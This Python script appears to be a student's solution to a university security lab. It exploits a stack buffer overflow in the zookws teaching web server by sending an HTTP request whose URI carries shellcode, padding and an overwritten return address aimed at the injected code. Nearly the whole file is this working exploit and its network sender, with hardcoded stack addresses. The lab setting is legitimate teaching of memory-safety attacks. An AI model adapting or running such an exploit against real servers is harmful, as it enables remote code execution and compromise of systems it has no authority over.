#!/usr/bin/python
import sys
import socket
import traceback
import urllib
import struct

####

## You might find it useful to define variables that store various
## stack or function addresses from the zookd / zookfs processes,
## which you can then use in build_exploit(); the following are just
## examples.


## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.

def build_exploit(shellcode, buffer_address, ebp):
    ## Things that you might find useful in constructing your exploit:
    ##   urllib.quote(s)
    ##     returns string s with "special" characters percent-encoded
    ##   struct.pack("<I", x)
    ##     returns the 4-byte binary encoding of the 32-bit integer x
    ##   variables for program addresses (ebp, buffer, retaddr=ebp+4)

	start_of_uri = '/' # Everything on the URI that will precede the attack code
	
	attack_code_address = buffer_address + len(start_of_uri) # We will  be placing our exploit code right after the '/' in the URI. Need to add one to the address of the buffer so that we skip over the slash and go to the code
	stack_return_address = ebp + 4 # Address the holding the return address 
	attack_code = urllib.quote(shellcode) # Get the code to inject from "shellcode.bin"
	
	# The URI is a '/', then the attack code, then repeats of the character "O" to fill up the buffer up until the return address on the stack frame, where the address of the attack code (in the buffer) is placed.
	uri = start_of_uri + attack_code + ('z' * (stack_return_address - buffer_address - len(shellcode) - len(start_of_uri))) + struct.pack("<I", attack_code_address)
	request = "GET " + uri + " HTTP/1.0\r\n\r\n"
	return request
	

####

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""
    while len(rbuf):
	resp = resp + rbuf
	rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####
buffer_address = 0xbfffee08
ebp = 0xbffff618

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "r")
    shellcode = shellfile.read()
    req = build_exploit(shellcode, buffer_address, ebp)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

